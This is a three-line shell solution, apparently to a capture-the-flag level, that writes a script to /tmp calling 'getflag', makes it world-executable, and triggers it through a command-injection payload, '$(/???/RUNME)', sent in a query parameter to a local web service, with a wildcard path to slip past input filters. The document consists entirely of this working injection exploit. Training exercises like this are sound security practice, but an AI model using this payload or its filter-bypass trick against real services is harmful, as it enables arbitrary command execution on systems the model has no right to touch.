
echo -e '#!/bin/sh\ngetflag > /tmp/flag12' > /tmp/RUNME

chmod 777 /tmp/RUNME

curl 'http://localhost:4646/?x=$(/???/RUNME)'
